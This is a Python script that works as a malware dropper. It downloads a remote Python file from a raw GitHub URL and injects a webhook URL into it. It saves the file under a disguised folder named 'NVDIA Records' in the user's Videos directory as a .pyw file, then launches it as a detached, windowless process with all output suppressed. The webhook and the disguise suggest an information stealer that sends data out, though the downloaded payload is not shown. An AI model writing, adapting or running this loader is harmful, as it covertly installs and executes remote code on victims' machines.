import os
import urllib.request
import subprocess
from pathlib import Path


githubraw = "https://raw.githubusercontent.com/erwandemoin/BUIDNBIH9H382H989H8/refs/heads/main/_vlc_.py"
Webhooook = webhook_url

path = os.path.join(Path.home(), 'Videos', 'NVDIA Records')
FilePath = os.path.join(path, 'encoding_records.pyw')

def CreateFandDownloadIT(Webhooook, githubraw):
    os.makedirs(path, exist_ok=True)
    response = urllib.request.urlopen(githubraw)
    remote_content = response.read().decode('utf-8')
    with open(FilePath, "w", encoding="utf8") as f:
        f.write(f"valueWebhook = '{Webhooook}'\n\n")
        f.write(remote_content)
    return FilePath

def StartProg(FilePath):
    try:

        if os.name == 'nt':
            
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            
            flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
            
            subprocess.Popen(
                ["pythonw", FilePath],
                creationflags=flags,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=False,
                close_fds=True
            )
        else:
            
            subprocess.Popen(
                ["pythonw", FilePath],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
                close_fds=True
            )
        
    except Exception as e:
        print(f"{e}")

def main():
    CreateFandDownloadIT(Webhooook, githubraw)
    StartProg(FilePath)

if __name__ == "__main__":
    main()
